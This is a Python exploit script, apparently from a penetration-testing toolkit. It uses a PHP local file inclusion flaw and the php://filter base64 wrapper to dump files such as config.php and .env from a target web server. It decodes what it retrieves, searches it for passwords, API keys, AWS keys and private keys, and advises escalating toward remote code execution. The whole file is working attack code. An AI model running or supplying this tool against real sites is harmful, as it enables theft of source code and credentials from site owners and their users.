#!/usr/bin/env python3
"""
phpfilter_dump.py — dump PHP source/secrets through an LFI using the php://filter base64 wrapper,
then decode it locally. The fastest high-value LFI win on PHP (LFI_TESTING_GUIDE.md §10).

Mark the injection point with PHP in the URL (where the php://filter payload goes), or the script
will append it to the given param.

Usage:
  python3 phpfilter_dump.py -u "https://target/?page=PHP" -r config.php -r .env -r database.php
  python3 phpfilter_dump.py -u "https://target/?page=PHP" -r index.php -o dumped/
"""
import argparse, base64, os, re, sys, urllib.parse as up
try:
    import requests
    requests.packages.urllib3.disable_warnings()  # noqa
except ImportError:
    sys.exit("pip install requests")

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36"
SECRET_RX = re.compile(r"(?i)(pass(word|wd)?|secret|api[_-]?key|token|AKIA[0-9A-Z]{16}|"
                       r"BEGIN [A-Z ]*PRIVATE KEY|DB_|AWS_|mysqli?_connect|PDO\()")

def build(url, resource):
    payload = f"php://filter/convert.base64-encode/resource={resource}"
    if "PHP" in url:
        return url.replace("PHP", up.quote(payload, safe=""))
    sep = "&" if "?" in url else "?"
    return url + sep + "page=" + up.quote(payload, safe="")

def extract_b64(body):
    # the dump is usually the longest base64-looking blob in the response
    cands = re.findall(r"[A-Za-z0-9+/]{40,}={0,2}", body)
    cands.sort(key=len, reverse=True)
    for c in cands:
        try:
            dec = base64.b64decode(c + "===", validate=False)
            if b"<?" in dec or b"=" in dec or dec.isascii():
                return dec
        except Exception:
            continue
    return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True, help="LFI URL; mark the spot with PHP")
    ap.add_argument("-r", "--resource", action="append", required=True, help="file to dump (repeatable)")
    ap.add_argument("-o", "--outdir")
    ap.add_argument("--timeout", type=float, default=15)
    a = ap.parse_args()

    if a.outdir:
        os.makedirs(a.outdir, exist_ok=True)

    for res in a.resource:
        u = build(a.url, res)
        try:
            r = requests.get(u, headers={"User-Agent": UA}, timeout=a.timeout, verify=False)
        except Exception as e:
            print(f"[err] {res}: {e}")
            continue
        dec = extract_b64(r.text)
        if not dec:
            print(f"[miss] {res}: no base64 source found (try a different path/depth or read=string.rot13)")
            continue
        text = dec.decode("utf-8", "ignore")
        secrets = sorted(set(m.group(0) for m in SECRET_RX.finditer(text)))
        print(f"\n===== {res} ({len(text)} bytes) =====")
        print(text[:1500] + ("\n... [truncated]" if len(text) > 1500 else ""))
        if secrets:
            print(f"\n  [!] secret indicators in {res}: {', '.join(secrets[:12])}")
            print("      -> validate any creds READ-ONLY, redact in the report, consider RCE pivot (§10/§11).")
        if a.outdir:
            safe = res.replace("/", "_").replace("\\", "_").replace("..", "")
            open(os.path.join(a.outdir, safe), "w", encoding="utf-8").write(text)

    print("\n[done] Dumped source is for ESCALATION: find DB/cloud creds, more includes, and an RCE path.")

if __name__ == "__main__":
    main()
